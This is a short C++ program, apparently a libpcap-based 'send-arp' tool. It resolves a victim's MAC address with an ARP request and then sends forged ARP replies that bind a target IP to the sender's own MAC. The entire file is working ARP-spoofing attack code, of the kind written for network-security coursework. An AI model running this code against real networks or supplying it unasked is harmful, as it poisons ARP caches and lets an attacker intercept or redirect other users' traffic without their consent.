#include <iostream>
#include <string>
#include <stdint.h>
#include <cstring>
#include <pcap.h>
#include <ctype.h>
#include "proto_structures.h"
#include "local_address.h"

mac_addr arp_request(const ipv4_addr& sip,const ipv4_addr& tip,const mac_addr& smac,const char *dev){
	arp_eth_ipv4 packet(smac,sip,tip);
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle=pcap_open_live(dev,BUFSIZ,1,1,errbuf);
	if(handle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	pcap_sendpacket(handle,packet,42);
	pcap_pkthdr* hdr;
	const uint8_t* ptr;
	if(!pcap_next_ex(handle,&hdr,&ptr)){
		printf("arp no reply\n");
		exit(1);
	}
	memcpy(&packet,ptr,42);
	pcap_close(handle);
	return packet.smac;
}

void arp_spoof(const char *str_sip,const char *str_tip,const ipv4_addr& ip,const mac_addr &mac,const char *dev){
	ipv4_addr sip(str_sip);
	ipv4_addr tip(str_tip);
	mac_addr victim_mac=arp_request(ip,sip,mac,dev);
	
	arp_eth_ipv4 packet(mac,victim_mac,tip,sip);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle=pcap_open_live(dev,0,0,0,errbuf);
	if(handle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	pcap_sendpacket(handle,packet,42);
	pcap_close(handle);
}

int main(int c,char **v){
	if(c&1){
		printf("syntex : send-arp <interface> <sender ip> <target ip> ...\n");
		return 1;
	}
	mac_addr mac=get_mac_addr(v[1]);
	ipv4_addr ip=get_ipv4_addr(v[1]);
	for(int i=2;i<c;i+=2)
		arp_spoof(v[i],v[i+1],ip,mac,v[1]);
	return 0;
}
